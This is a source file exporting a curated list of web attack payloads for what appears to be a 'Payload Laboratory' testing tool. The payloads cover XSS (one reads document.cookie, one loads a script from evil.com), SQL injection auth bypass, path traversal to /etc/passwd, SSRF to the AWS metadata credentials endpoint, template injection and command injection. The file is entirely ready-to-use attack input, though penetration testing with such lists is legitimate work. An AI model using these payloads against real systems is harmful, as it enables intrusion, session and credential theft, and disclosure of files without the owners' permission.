/**
 * A curated list of advanced community payloads for the Payload Laboratory.
 */

export const COMMUNITY_PAYLOADS = [
  {
    id: "comm_xss_1",
    name: "SVG onload XSS",
    category: "XSS",
    content: "<svg/onload=alert(1)>",
    tags: ["xss", "svg", "bypass"],
  },
  {
    id: "comm_xss_2",
    name: "Img onerror XSS",
    category: "XSS",
    content: "<img src=x onerror=prompt(document.cookie)>",
    tags: ["xss", "img", "cookie"],
  },
  {
    id: "comm_xss_3",
    name: "Javascript Pseudo-protocol XSS",
    category: "XSS",
    content: "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://evil.com/xss.js\\';document.body.appendChild(a)')",
    tags: ["xss", "javascript-uri", "rce"],
  },
  {
    id: "comm_sqli_1",
    name: "Time-based Blind SQLi",
    category: "SQLi",
    content: "1' OR SLEEP(5)--",
    tags: ["sqli", "blind", "time"],
  },
  {
    id: "comm_sqli_2",
    name: "Auth Bypass SQLi",
    category: "SQLi",
    content: "admin' OR 1=1 --",
    tags: ["sqli", "auth-bypass"],
  },
  {
    id: "comm_lfi_1",
    name: "Basic LFI (/etc/passwd)",
    category: "LFI",
    content: "../../../../../../../../etc/passwd",
    tags: ["lfi", "linux", "passwd"],
  },
  {
    id: "comm_lfi_2",
    name: "Null Byte LFI",
    category: "LFI",
    content: "../../../../../../../../etc/passwd%00",
    tags: ["lfi", "linux", "null-byte"],
  },
  {
    id: "comm_ssrf_1",
    name: "AWS Metadata SSRF",
    category: "SSRF",
    content: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    tags: ["ssrf", "aws", "metadata"],
  },
  {
    id: "comm_ssrf_2",
    name: "Localhost Bypass (Decimal)",
    category: "SSRF",
    content: "http://2130706433/",
    tags: ["ssrf", "bypass", "localhost"],
  },
  {
    id: "comm_ssti_1",
    name: "Jinja2 SSTI",
    category: "SSTI",
    content: "{{7*7}}",
    tags: ["ssti", "jinja2", "python"],
  },
  {
    id: "comm_ssti_2",
    name: "Freemarker SSTI",
    category: "SSTI",
    content: "${7*7}",
    tags: ["ssti", "freemarker", "java"],
  },
  {
    id: "comm_cmdi_1",
    name: "Ping Command Injection",
    category: "Command Injection",
    content: "; ping -c 5 127.0.0.1",
    tags: ["cmdi", "linux", "ping"],
  },
];
